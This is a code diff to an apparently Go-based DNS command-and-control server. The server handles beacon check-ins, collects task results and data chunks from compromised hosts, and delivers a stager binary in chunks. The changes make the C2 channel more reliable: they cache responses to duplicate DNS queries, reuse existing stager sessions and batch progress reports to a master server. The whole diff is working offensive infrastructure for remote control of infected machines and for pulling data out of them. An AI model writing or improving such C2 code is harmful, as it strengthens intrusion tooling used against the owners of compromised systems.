@@ -91,6 +91,7 @@ type C2Manager struct {
 	stagerSessions       map[string]*StagerSession       // key: clientIP
 	cachedStagerSessions map[string]*CachedStagerSession // key: sessionID (for cache-based sessions)
 	recentMessages       map[string]time.Time            // key: message hash, value: timestamp (deduplication)
+	cachedResponses      map[string]string               // key: message hash, value: cached response (for duplicates)
 	db                   *Database                       // Database for persistent storage
 	mutex                sync.RWMutex
 	taskCounter          int
@@ -135,6 +136,7 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 		stagerSessions:       make(map[string]*StagerSession),
 		cachedStagerSessions: make(map[string]*CachedStagerSession),
 		recentMessages:       make(map[string]time.Time),
+		cachedResponses:      make(map[string]string),
 		db:                   db,
 		taskCounter:          TaskCounterStart,
 		debug:                debug,
@@ -768,6 +770,14 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	c2.mutex.Lock()
 	if lastSeen, exists := c2.recentMessages[msgHash]; exists {
 		isDuplicate = true
+		// Check if we have a cached response for this duplicate
+		if cachedResp, hasCached := c2.cachedResponses[msgHash]; hasCached {
+			c2.mutex.Unlock()
+			if c2.debug {
+				logf("[DEBUG] Duplicate message detected (seen %v ago), returning cached response", time.Since(lastSeen))
+			}
+			return cachedResp, true
+		}
 		c2.mutex.Unlock()
 		if c2.debug {
 			logf("[DEBUG] Duplicate message detected (seen %v ago)", time.Since(lastSeen))
@@ -779,38 +789,47 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 	}
 
 	messageType := strings.SplitN(decoded, "|", 2)[0]
+	var response string
+	var validMessage bool
+
 	switch messageType {
 	case "STG": // Stager request
 		parts := strings.SplitN(decoded, "|", 4) // STG|IP|OS|ARCH
 		if len(parts) < 4 {
 			return "", false
 		}
-		return c2.handleStagerRequest(parts, clientIP, isDuplicate), true
+		response = c2.handleStagerRequest(parts, clientIP, isDuplicate)
+		validMessage = true
 
 	case "ACK": // DEPRECATED: Old stager acknowledgment protocol
 		parts := strings.SplitN(decoded, "|", 4) // ACK|chunk_index|IP|session
 		if len(parts) < 2 {
 			return "", false
 		}
-		return c2.handleStagerAck(parts, clientIP, isDuplicate), true
+		response = c2.handleStagerAck(parts, clientIP, isDuplicate)
+		validMessage = true
 
 	case "CHUNK": // Stager chunk request (new protocol) OR legacy client chunking
 		parts := strings.SplitN(decoded, "|", 6)
 		if len(parts) == 4 {
 			// New stager protocol: CHUNK|index|IP|sessionID
-			return c2.handleStagerAck(parts, clientIP, isDuplicate), true
+			response = c2.handleStagerAck(parts, clientIP, isDuplicate)
+			validMessage = true
 		} else if len(parts) >= 6 {
 			// Legacy client chunking protocol
-			return c2.handleChunk(parts), true
+			response = c2.handleChunk(parts)
+			validMessage = true
+		} else {
+			return "", false
 		}
-		return "", false
 
 	case "CHECKIN", "CHK":
 		parts := strings.SplitN(decoded, "|", 5) // CHK|id|host|user|os
 		if len(parts) < 5 {
 			return "", false
 		}
-		return c2.handleCheckin(parts, clientIP, isDuplicate), true
+		response = c2.handleCheckin(parts, clientIP, isDuplicate)
+		validMessage = true
 
 	case "RESULT":
 		// RESULT|beaconID|taskID|<entire result...>
@@ -818,14 +837,16 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		if len(parts) < 4 {
 			return "", false
 		}
-		return c2.handleResult(parts, isDuplicate), true
+		response = c2.handleResult(parts, isDuplicate)
+		validMessage = true
 
 	case "RESULT_META":
 		parts := strings.SplitN(decoded, "|", 5) // RESULT_META|id|task|size|chunks
 		if len(parts) < 5 {
 			return "", false
 		}
-		return c2.handleResultMeta(parts, isDuplicate), true
+		response = c2.handleResultMeta(parts, isDuplicate)
+		validMessage = true
 
 	case "DATA":
 		// DATA|id|taskID|index|<chunk...>
@@ -833,7 +854,8 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		if len(parts) < 5 {
 			return "", false
 		}
-		return c2.handleData(parts, isDuplicate), true
+		response = c2.handleData(parts, isDuplicate)
+		validMessage = true
 
 	default:
 		// Only log if debug mode (reduces noise from random DNS queries)
@@ -842,6 +864,18 @@ func (c2 *C2Manager) processBeaconQuery(qname string, clientIP string) (string, 
 		}
 		return "", false
 	}
+
+	// Cache the response for duplicate handling (only if not a duplicate itself)
+	if validMessage && !isDuplicate && response != "" {
+		c2.mutex.Lock()
+		c2.cachedResponses[msgHash] = response
+		c2.mutex.Unlock()
+		if c2.debug {
+			logf("[DEBUG] Cached response for message hash: %s", msgHash[:16])
+		}
+	}
+
+	return response, validMessage
 }
 
 // handleCheckin processes a beacon check-in
@@ -1298,6 +1332,22 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 	// In distributed mode, ONLY serve from cache
 	// The cache should have been pushed during DNS server checkin
 	if masterClient != nil && c2.db != nil {
+		// First check if we already have a session for this stager IP
+		// This prevents creating duplicate sessions from DNS retries
+		c2.mutex.RLock()
+		for sessionID, session := range c2.cachedStagerSessions {
+			if session.StagerIP == stagerIP {
+				c2.mutex.RUnlock()
+				// Return existing session's META response
+				metaResponse := fmt.Sprintf("META|%s|%d", sessionID, session.TotalChunks)
+				if !isDuplicate {
+					logf("[C2] Using existing session %s for stager %s", sessionID, stagerIP)
+				}
+				return metaResponse
+			}
+		}
+		c2.mutex.RUnlock()
+
 		// Look for cached client binary
 		if !isDuplicate {
 			logf("[C2] 🔍 Checking stager_chunk_cache for any cached binaries...")
@@ -1556,9 +1606,21 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 				cachedSession.LastActivity = time.Now()
 				c2.mutex.Unlock()
 
-				// Report chunk delivery to Master (async, batched reporting)
-				// Only report every 100 chunks, first chunk, or last chunk to reduce Master load
-				if chunkIndex == 0 || chunkIndex%100 == 0 || chunkIndex == cachedSession.TotalChunks-1 {
+				// Report chunk delivery to Master (async, with smart batching)
+				// Report frequently at start, then batch, then frequently at end
+				shouldReport := false
+				if chunkIndex < 10 {
+					// Report first 10 chunks individually for immediate feedback
+					shouldReport = true
+				} else if chunkIndex >= cachedSession.TotalChunks-10 {
+					// Report last 10 chunks individually for accurate completion
+					shouldReport = true
+				} else if chunkIndex%50 == 0 {
+					// Report every 50th chunk in the middle
+					shouldReport = true
+				}
+
+				if shouldReport && !isDuplicate {
 					go func() {
 						err := masterClient.ReportStagerProgress(sessionID, chunkIndex, stagerIP)
 						if err != nil && c2.debug {
